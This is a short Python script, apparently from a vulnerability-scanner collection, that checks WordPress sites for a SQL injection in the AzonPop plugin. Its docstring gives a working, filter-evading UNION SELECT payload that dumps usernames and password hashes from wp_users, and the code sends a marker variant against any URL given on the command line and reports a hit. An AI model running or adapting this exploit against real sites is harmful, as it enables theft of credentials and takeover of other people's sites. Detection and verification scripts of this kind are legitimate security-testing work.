#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Wordpress AzonPop插件SQL注入
referer: https://cxsecurity.com/issue/WLB-2016010049
author: Lucifer
description: payload:/wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null /*!00000union*/ select 1,2,/*!00000gRoup_ConCat(unhex(hex(user_login)),0x3c2f62723e,unhex(hex(user_pass)))*/,4,5 /*!00000from*/ wp_users
'''
import sys
import requests
import warnings
from termcolor import cprint

class wordpress_plugin_azonpop_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/wp-content/plugins/AzonPop/files/view/showpopup.php?popid=null%20/*!00000union*/%20select%201,2,/*!00000gRoup_ConCat(unhex(hex(Md5(1234))),0x3c2f62723e,unhex(hex(Md5(1234))))*/,4,5%20/*!00000from*/%20wp_users"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在Wordpress AzonPop插件SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = wordpress_plugin_azonpop_sqli_BaseVerify(sys.argv[1])
    testVuln.run()
